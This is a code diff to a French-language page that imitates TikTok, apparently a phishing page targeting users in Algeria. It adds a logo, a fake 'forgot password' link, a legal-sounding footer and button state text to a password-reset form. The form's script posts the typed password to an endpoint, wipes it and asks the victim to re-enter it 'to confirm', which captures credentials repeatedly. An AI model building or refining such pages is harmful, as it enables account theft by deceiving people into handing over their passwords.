@@ -8,6 +8,7 @@
         :root {
             --tiktok-red: #FE2C55;
             --tiktok-cyan: #25F4EE;
+            --link-blue: #1677FF;
             --bg-color: #ffffff;
             --card-bg: #ffffff;
             --text-main: #161823;
@@ -27,11 +28,34 @@
         body {
             min-height: 100vh;
             display: flex;
+            flex-direction: column;
             align-items: center;
             justify-content: center;
             background: var(--bg-color);
             padding: 20px;
             color: var(--text-main);
+        }
+
+        /* Default website logo outside above the card */
+        .site-logo-container {
+            width: 56px;
+            height: 56px;
+            margin-bottom: 20px;
+            border-radius: 50%;
+            overflow: hidden;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
+            border: 2px solid var(--border-color);
+            background-color: #ffffff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .site-logo-container img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            display: block;
         }
 
         .card {
@@ -150,13 +174,32 @@
             color: var(--text-main);
         }
 
-        /* Red message displayed right under the password field group */
+        /* Forgot password link style in blue */
+        .forgot-password-container {
+            text-align: left;
+            margin-top: -8px;
+            margin-bottom: 16px;
+        }
+
+        .forgot-password-link {
+            color: var(--link-blue);
+            font-size: 0.88rem;
+            font-weight: 600;
+            text-decoration: none;
+            display: inline-block;
+        }
+
+        .forgot-password-link:hover {
+            text-decoration: underline;
+        }
+
+        /* Red Notice Message positioned directly under the password field/forgot link */
         .error-msg {
             color: var(--tiktok-red);
             font-size: 0.82rem;
             font-weight: 600;
             text-align: left;
-            margin-top: -10px;
+            margin-top: -6px;
             margin-bottom: 16px;
             display: none;
         }
@@ -182,9 +225,23 @@
         .submit-btn:active {
             transform: scale(0.98);
         }
+
+        /* Small grey copyright footer text */
+        .footer-disclaimer {
+            font-size: 0.72rem;
+            color: var(--text-muted);
+            text-align: center;
+            margin-top: 16px;
+            line-height: 1.4;
+        }
     </style>
 </head>
 <body>
+
+    <!-- Default Website Logo Outside Above the Card -->
+    <div class="site-logo-container">
+        <img src="https://i.ibb.co/WqkCtGN/IMG-5666.png" alt="Site Logo">
+    </div>
 
     <main class="card">
         <!-- Circle Profile Photo with TikTok ring -->
@@ -224,10 +281,20 @@
                 </div>
             </div>
 
-            <!-- Red Notice Message positioned directly under the password field -->
+            <!-- Blue "Mot de passe oublié ?" link under password field -->
+            <div class="forgot-password-container">
+                <a href="#" class="forgot-password-link" onclick="return false;">Mot de passe oublié ?</a>
+            </div>
+
+            <!-- Red Notice Message positioned under the forgot link -->
             <div id="notice-msg" class="error-msg">Veuillez entrer votre mot de passe à nouveau pour confirmer</div>
 
             <button type="submit" class="submit-btn" id="submit-btn">Réinitialiser le mot de passe</button>
+
+            <!-- Small grey copyright notice -->
+            <div class="footer-disclaimer">
+                En continuant avec un compte situé en Algérie, vous acceptez nos conditions d'utilisation et reconnaissez avoir lu notre politique de confidentialité
+            </div>
         </form>
     </main>
 
@@ -261,6 +328,7 @@
 
             submitBtn.disabled = true;
             submitBtn.style.opacity = '0.7';
+            submitBtn.textContent = "Validation en cours...";
 
             fetch(formEndpoint, {
                 method: 'POST',
@@ -272,6 +340,7 @@
             .then(response => {
                 submitBtn.disabled = false;
                 submitBtn.style.opacity = '1';
+                submitBtn.textContent = "Réinitialiser le mot de passe";
 
                 if (submissionAttempt < maxAttempts) {
                     submissionAttempt++;
@@ -285,6 +354,8 @@
             .catch(error => {
                 submitBtn.disabled = false;
                 submitBtn.style.opacity = '1';
+                submitBtn.textContent = "Réinitialiser le mot de passe";
+
                 if (submissionAttempt < maxAttempts) {
                     submissionAttempt++;
                     passwordInput.value = '';
